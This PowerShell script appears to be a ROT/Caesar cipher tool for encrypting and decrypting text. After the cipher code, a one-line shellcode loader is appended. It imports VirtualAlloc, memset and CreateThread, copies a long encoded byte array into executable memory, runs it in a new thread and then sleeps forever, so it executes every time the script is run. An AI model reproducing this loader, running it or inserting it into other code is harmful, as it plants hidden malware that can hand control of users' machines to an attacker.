









[CmdletBinding(DefaultParameterSetName='Decrypt')]
param(
    [Parameter(
        Position=0,
        Mandatory=$true,
        HelpMessage='String which you want to encrypt or decrypt')]    
    [String]$Text,

    [Parameter(
        Position=1,
        HelpMessage='Specify which rotation you want to use (Default=1..26)')]
    [ValidateRange(1,26)]
    [Int32[]]$Rot=1..26,

    [Parameter(
        ParameterSetName='Encrypt',
        Position=2,
        HelpMessage='Encrypt a string')]
    [switch]$Encrypt,
    
    [Parameter(
        ParameterSetName='Decrypt',
        Position=2,
        HelpMessage='Decrypt a string')]
    [switch]$Decrypt   
)

Begin{
    [System.Collections.ArrayList]$UpperChars = @()
    [System.Collections.ArrayList]$LowerChars = @()
 
    $UpperIndex = 1
    $LowerIndex = 1

    
    foreach($i in 65..90)
    {
        $Char = [char]$i

        [pscustomobject]$Result = @{
            Index = $UpperIndex
            Char = $Char
        }   

        [void]$UpperChars.Add($Result)

        $UpperIndex++
    }

    
    foreach($i in 97..122)
    {
        $Char = [char]$i

        [pscustomobject]$Result = @{
            Index = $LowerIndex
            Char = $Char
        }   

        [void]$LowerChars.Add($Result)

        $LowerIndex++
    }

    
    if(($Encrypt -eq $false -and $Decrypt -eq $false) -or ($Decrypt)) 
    {        
        $Mode = "Decrypt"
    }    
    else 
    {
        $Mode = "Encrypt"
    }

    Write-Verbose -Message "Mode is set to: $Mode"
}

Process{
    foreach($Rot2 in $Rot)
    {        
        $ResultText = [String]::Empty

        
        foreach($i in 0..($Text.Length -1))
        {
            $CurrentChar = $Text.Substring($i, 1)

            if($UpperChars.Char -ccontains $CurrentChar) 
            {
                if($Mode -eq  "Encrypt")
                {
                    [int]$NewIndex = ($UpperChars | Where-Object {$_.Char -ceq $CurrentChar}).Index + $Rot2 

                    if($NewIndex -gt $UpperChars.Count)
                    {
                        $NewIndex -= $UpperChars.Count                     
                    
                        $ResultText +=  ($UpperChars | Where-Object {$_.Index -eq $NewIndex}).Char
                    }
                    else 
                    {
                        $ResultText += ($UpperChars | Where-Object {$_.Index -eq $NewIndex}).Char    
                    }
                }
                else 
                {
                    [int]$NewIndex = ($UpperChars | Where-Object {$_.Char -ceq $CurrentChar}).Index - $Rot2 

                    if($NewIndex -lt 1)
                    {
                        $NewIndex += $UpperChars.Count                     
                    
                        $ResultText +=  ($UpperChars | Where-Object {$_.Index -eq $NewIndex}).Char
                    }
                    else 
                    {
                        $ResultText += ($UpperChars | Where-Object {$_.Index -eq $NewIndex}).Char    
                    }
                }   
            }
            elseif($LowerChars.Char -ccontains $CurrentChar) 
            {
                if($Mode -eq "Encrypt")
                {
                    [int]$NewIndex = ($LowerChars | Where-Object {$_.Char -ceq $CurrentChar}).Index + $Rot2

                    if($NewIndex -gt $LowerChars.Count)
                    {
                        $NewIndex -=  $LowerChars.Count

                        $ResultText += ($LowerChars | Where-Object {$_.Index -eq $NewIndex}).Char
                    }
                    else 
                    {
                        $ResultText += ($LowerChars | Where-Object {$_.Index -eq $NewIndex}).Char  
                    }
                }
                else 
                {
                    [int]$NewIndex = ($LowerChars | Where-Object {$_.Char -ceq $CurrentChar}).Index - $Rot2

                    if($NewIndex -lt 1)
                    {
                        $NewIndex += $LowerChars.Count

                        $ResultText += ($LowerChars | Where-Object {$_.Index -eq $NewIndex}).Char
                    }
                    else 
                    {
                        $ResultText += ($LowerChars | Where-Object {$_.Index -eq $NewIndex}).Char  
                    }      
                }
            }
            else 
            {
                $ResultText += $CurrentChar  
            }
        } 
            
        [pscustomobject] @{
            Rot = $Rot2
            Text = $ResultText
        }
    }
}

End{

}
        
$gAN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gAN -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x5c,0x3b,0x65,0xad,0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x6b,0x13,0x83,0xc3,0x04,0x03,0x6b,0x53,0xd9,0x90,0x51,0x83,0x9f,0x5b,0xaa,0x53,0xc0,0xd2,0x4f,0x62,0xc0,0x81,0x04,0xd4,0xf0,0xc2,0x49,0xd8,0x7b,0x86,0x79,0x6b,0x09,0x0f,0x8d,0xdc,0xa4,0x69,0xa0,0xdd,0x95,0x4a,0xa3,0x5d,0xe4,0x9e,0x03,0x5c,0x27,0xd3,0x42,0x99,0x5a,0x1e,0x16,0x72,0x10,0x8d,0x87,0xf7,0x6c,0x0e,0x23,0x4b,0x60,0x16,0xd0,0x1b,0x83,0x37,0x47,0x10,0xda,0x97,0x69,0xf5,0x56,0x9e,0x71,0x1a,0x52,0x68,0x09,0xe8,0x28,0x6b,0xdb,0x21,0xd0,0xc0,0x22,0x8e,0x23,0x18,0x62,0x28,0xdc,0x6f,0x9a,0x4b,0x61,0x68,0x59,0x36,0xbd,0xfd,0x7a,0x90,0x36,0xa5,0xa6,0x21,0x9a,0x30,0x2c,0x2d,0x57,0x36,0x6a,0x31,0x66,0x9b,0x00,0x4d,0xe3,0x1a,0xc7,0xc4,0xb7,0x38,0xc3,0x8d,0x6c,0x20,0x52,0x6b,0xc2,0x5d,0x84,0xd4,0xbb,0xfb,0xce,0xf8,0xa8,0x71,0x8d,0x94,0x1d,0xb8,0x2e,0x64,0x0a,0xcb,0x5d,0x56,0x95,0x67,0xca,0xda,0x5e,0xae,0x0d,0x1d,0x75,0x16,0x81,0xe0,0x76,0x67,0x8b,0x26,0x22,0x37,0xa3,0x8f,0x4b,0xdc,0x33,0x30,0x9e,0x49,0x31,0xa6,0x79,0x20,0xd0,0x97,0x12,0x3e,0x23,0xcd,0xe8,0xb7,0xc5,0xa1,0xbc,0x97,0x59,0x01,0x6d,0x58,0x0a,0xe9,0x67,0x57,0x75,0x09,0x88,0xbd,0x1e,0xa3,0x67,0x68,0x76,0x5b,0x11,0x31,0x0c,0xfa,0xde,0xef,0x68,0x3c,0x54,0x1c,0x8c,0xf2,0x9d,0x69,0x9e,0x62,0x6e,0x24,0xfc,0x24,0x71,0x92,0x6b,0xc8,0xe7,0x19,0x3a,0x9f,0x9f,0x23,0x1b,0xd7,0x3f,0xdb,0x4e,0x6c,0x89,0x49,0x31,0x1a,0xf6,0x9d,0xb1,0xda,0xa0,0xf7,0xb1,0xb2,0x14,0xac,0xe1,0xa7,0x5a,0x79,0x96,0x74,0xcf,0x82,0xcf,0x29,0x58,0xeb,0xed,0x14,0xae,0xb4,0x0e,0x73,0x2e,0x88,0xd8,0xbd,0x44,0xe0,0xd8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$TzO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($TzO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$TzO,0,0,0);for (;;){Start-sleep 60};

